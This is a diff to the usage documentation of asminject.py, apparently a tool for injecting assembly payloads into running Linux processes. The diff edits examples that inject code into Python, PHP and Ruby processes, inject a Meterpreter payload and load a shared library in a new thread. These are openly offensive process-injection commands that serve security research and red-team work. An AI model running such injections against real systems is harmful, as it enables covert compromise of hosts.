@@ -13,6 +13,8 @@
 
 ## Injecting Python code into a Python 3 process
 
+Note the use of the `--non-pic-binary` option discussed in <a href="docs/specialized_options.md#specifying-non-pic-code">specialized options</a>, as this is required for Python 3.7 specifically. For other Python versions, you may or may not need to exclude the option.
+
 Terminal 1:
 
 ```
@@ -27,7 +29,7 @@ Terminal 2:
 ```
 # ps auxww | grep python
 
-pi       26611  1.8  0.8  14372  7160 pts/0    S+   15:16   0:00 python3 ./python_loop.py
+pi       26611  [...] python3 ./python_loop.py
 
 # python3 ./asminject.py 26611 execute_python_code.s \
    --arch arm32 --relative-offsets-from-binaries \
@@ -67,7 +69,7 @@ Terminal 2:
 ```
 # ps auxww | grep python
 
-pi       24704  1.0  2.4  27720 21040 pts/0    S+   15:10   0:00 python2 ./python_loop.py
+pi       24704  [...] python2 ./python_loop.py
 
 # python3 ./asminject.py 24704 execute_python_code.s \
    --arch arm32 --relative-offsets-from-binaries \
@@ -119,7 +121,7 @@ Terminal 2:
 ```
 # ps auxww | grep php
 
-pi        4955  0.0  1.6  62616 14068 pts/0    SN+  17:08   0:00 /usr/bin/php ./php_loop.php
+pi        4955  [...] /usr/bin/php ./php_loop.php
 
 # python3 ./asminject.py 4955 execute_php_code.s \
    --arch arm32 --relative-offsets-from-binaries \
@@ -155,7 +157,7 @@ Terminal 2:
 ```
 # ps auxww | grep ruby
 
-pi       12000  4.8  0.7  22144  6756 pts/0    Sl+  16:03   0:00 ruby ./ruby_loop.rb
+pi       12000  [...] ruby ./ruby_loop.rb
 
 # python3 ./asminject.py 12000 execute_ruby_code.s \
    --arch arm32 --relative-offsets-from-binaries \
@@ -217,9 +219,8 @@ In a third terminal, locate the process and inject the Meterpreter payload into 
 ```
 # ps auxww | grep python
 
-pi        5283  0.3  5.1  54224 44908 pts/1    S    13:00   0:06 gdb --args python3 ./python_loop.py
-pi        5487  0.0  0.9  23524  8008 pts/1    SNl+ 13:29   0:00 /usr/bin/python3 ./python_loop.py
-
+pi        5283  [...] gdb --args python3 ./python_loop.py
+pi        5487  [...] /usr/bin/python3 ./python_loop.py
 
 # python3 ./asminject.py 5487 execute_precompiled.s \
    --arch arm32 --stop-method "slow" \
@@ -263,7 +264,6 @@ This payload requires relative offsets for `libpthread` shared library used by t
    --arch arm32 --relative-offsets-from-binaries \
    --stop-method "slow" \
    --precompiled lmrtarm11443
-...omitted for brevity...
 ```
 
 Warnings:
@@ -291,6 +291,8 @@ The injection comes with the same warnings as for `execute_precompiled.s*`, abov
 
 ## Inject a Linux shared library (.so) file into a new thread in an existing process
 
+*note: this seems to be broken at present*
+
 The `dlinject_threaded.s` payload is identical to `dlinject.s`, except that it launches the shellcode in a new thread, so that the original process continues performing its normal behaviour.
 
 This payload requires one variable: `librarypath`, which should point to the library you want to inject.
@@ -300,7 +302,7 @@ This payload requires relative offsets for the `libdl` and `libpthread` shared l
 ```
 # python3 ./asminject.py 5750 dlinject_threaded.s \
    --arch arm32 --relative-offsets-from-binaries \
-   --relative-offsets-from-binaries --stop-method "slow" \
+   --stop-method "slow" \
    --var librarypath "/home/pi/asminject/execute_inline_shellcode.so"
 ```
 
